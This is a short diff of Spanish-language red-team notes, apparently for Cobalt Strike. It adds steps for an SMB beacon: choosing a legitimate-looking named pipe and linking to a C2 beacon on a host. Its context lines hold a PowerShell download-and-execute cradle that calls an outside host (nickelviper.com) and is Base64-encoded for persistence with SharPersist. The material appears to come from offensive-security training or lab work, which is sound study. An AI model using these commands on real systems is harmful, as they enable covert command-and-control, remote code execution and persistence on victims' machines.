@@ -80,6 +80,15 @@ End Sub
     </body>
 </html>
 ```
+## SMB Beacon
+Elegir un Pipename legítimo (coger uno de TSVCPIPE)
+```
+ls \\.\pipe\
+```
+Conectarse al beacon
+```
+link HOST Pipename(C2)
+```
 
 # Host Persistence con SharPersist
 
@@ -92,6 +101,9 @@ $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a
 ```
 ```
 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+```
+```
+Write-Output $str
 ```
 Configuration of the Host Persistence
 ```
